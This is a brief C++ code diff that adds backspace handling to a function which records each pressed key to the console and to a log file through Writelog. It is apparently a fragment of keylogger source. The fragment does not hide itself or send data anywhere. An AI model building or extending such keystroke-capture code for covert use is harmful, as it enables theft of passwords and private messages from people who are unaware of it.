@@ -34,3 +34,7 @@ bool Keylist(int iKey){
             cout << " shift ";
             Writelog(" Shift ");
             break;
+		case VK_BACK:
+            cout << "\b";
+            Writelog("\b");
+            break;
